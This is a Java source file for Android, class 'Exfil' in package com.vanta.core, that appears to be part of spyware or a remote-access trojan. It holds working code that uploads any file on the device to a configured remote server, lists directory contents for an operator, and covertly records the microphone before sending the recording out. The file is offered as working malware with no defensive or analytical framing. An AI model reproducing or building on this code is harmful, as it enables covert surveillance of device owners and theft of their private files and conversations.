package com.vanta.core;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class Exfil {

    public static String upload(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "not-found:" + path;

            String boundary = "----VANTA" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection) new URL(Config.SERVER + "/upload").openConnection();
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + boundary + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + f.getName() + "\"\r\n");
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            FileInputStream in = new FileInputStream(f);
            byte[] buf = new byte[8192];
            int r;
            while ((r = in.read(buf)) > 0) out.write(buf, 0, r);
            in.close();

            out.writeBytes("\r\n--" + boundary + "--\r\n");
            out.flush();
            out.close();

            int code = c.getResponseCode();
            c.getInputStream().close();
            return "uploaded:" + f.getName() + " (" + code + ")";
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    public static String list(String path) {
        try {
            File d = new File(path);
            StringBuilder sb = new StringBuilder();
            File[] fs = d.listFiles();
            if (fs == null) return "empty";
            int n = 0;
            for (File f : fs) {
                if (n++ > 60) break;
                sb.append(f.isDirectory() ? "[D] " : "[F] ")
                  .append(f.getName())
                  .append(" (").append(f.length()).append(")\n");
            }
            return sb.toString();
        } catch (Exception e) { return "err:" + e.getMessage(); }
    }

    public static String mic(android.content.Context ctx, int seconds) {
        String path = ctx.getExternalFilesDir(null) + "/rec_" + System.currentTimeMillis() + ".m4a";
        try {
            android.media.MediaRecorder rec = new android.media.MediaRecorder();
            rec.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
            rec.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
            rec.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
            rec.setOutputFile(path);
            rec.prepare();
            rec.start();
            Thread.sleep(seconds * 1000L);
            rec.stop();
            rec.release();
            return upload(path);
        } catch (Exception e) { return "mic-err:" + e.getMessage(); }
    }
}
